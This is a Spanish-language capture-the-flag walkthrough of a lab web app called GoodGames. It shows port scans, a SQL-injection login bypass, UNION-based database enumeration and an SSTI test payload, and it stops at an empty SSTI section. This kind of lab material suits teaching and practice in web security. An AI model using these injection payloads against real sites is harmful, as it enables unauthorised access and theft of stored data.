`nmap -p- --open -sS --min-rate 5000 -n -Pn -vvv 10.10.11.130 -oG allPorts`

```ad-done
80/tcp open  http    syn-ack ttl 63
```

`nmap -p80 -sCV 10.10.11.130 -oN targeted`

```ad-done
80/tcp open  http    Werkzeug httpd 2.0.2 (Python 3.9.2)
|_http-title: GoodGames | Community and Store
|_http-server-header: Werkzeug/2.0.2 Python/3.9.2
```

`whatweb http://10.10.11.130`

Encontramos un icono de un usuario para hacer login, junto con un panel de registro

### SQL Injection

Usaremos [[BURPSUITE]] para interceptar el trafico y poder manipularlo

Interceptamos le trafico del login con burpsuite y le añadimos después del email `' or 1=1-- -`
Al enviarlo obtenemos una respuesta en la que se intenta setear una cookie de sesión

Y mas para abajo nos muestra
`Welcome admin`

Así que eso quiere decir que es vulnerable a una inyección sql

Estaremos accediendo como administrador a la pagina web

Desde dentro del panel de administración podemos acceder a un login de `Flask Volt`

Con searchexploit buscamos si hay algún tipo de vulnerabilidad afectada a este servicio, no encontramos nada relacionado

EN la misma consulta anterior de la inyección SQL vamos a hacer una enumeración de las bases de datos para buscar usuarios y a posterior buscar reutilización de credenciales y poder usarlos en este panel de login

Haciendo un ordenamiento de los datos basándonos en el numero de columnas encontramos que la respuesta diferente se acontece en la columna numero 4
`' order by 4-- -`

Ahora sabiendo el total de columnas vamos a seleccionar el total de columnas existentes
`' union select 1,2,3,4-- -`

Me esta devolviendo un `Welcome 4`, si el `4` de la petición lo modificamos por un `test` nos devolverá un `welcomne test`

Probaremos viendo si resuelve la siguiente petición de comprobación de SSTI
`' union select 1,2,3,"{{7*7}}"-- -`

Al no tramitarlo y devolver un 49 no es un punto de SSTI

Ahora probaremos haciendo la petición para que nos muestre el nombre de la base de datos
`' union select 1,2,3,database()-- -`

Nos muestra el nombre de esta
`welcome main`

Para que nos diga todas las bases de datos usaremos
`' union select 1,2,3,schema_name from information_schema.schemata-- -` 

Nos muestra el nombre de 
`information_schema` y `main`

Vamos a enumerar la base de datos llamada main
Ver las tablas que están en ella




### SSTI (Server Side Template Injection )

